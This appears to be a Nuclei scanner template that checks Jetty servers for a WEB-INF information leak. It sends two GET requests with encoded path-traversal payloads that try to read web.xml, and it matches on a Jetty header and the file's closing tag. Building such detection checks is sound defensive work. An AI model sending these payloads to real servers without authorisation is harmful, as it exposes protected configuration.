id: jetty-web-inf-info-leak
info:
  name: Jetty WEB-INF Directory Information Leak
  author: ProjectDiscoveryAI
  severity: medium
  tags: info-leak
http:
  - method: GET
    path:
      - "{{BaseURL}}/.%2FWEB-INF%2Fweb.xml"
      - "{{BaseURL}}/static?/%2557EB-INF/web.xml"
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "Server: Jetty"
      - type: word
        part: body
        words:
          - "</web-app>"
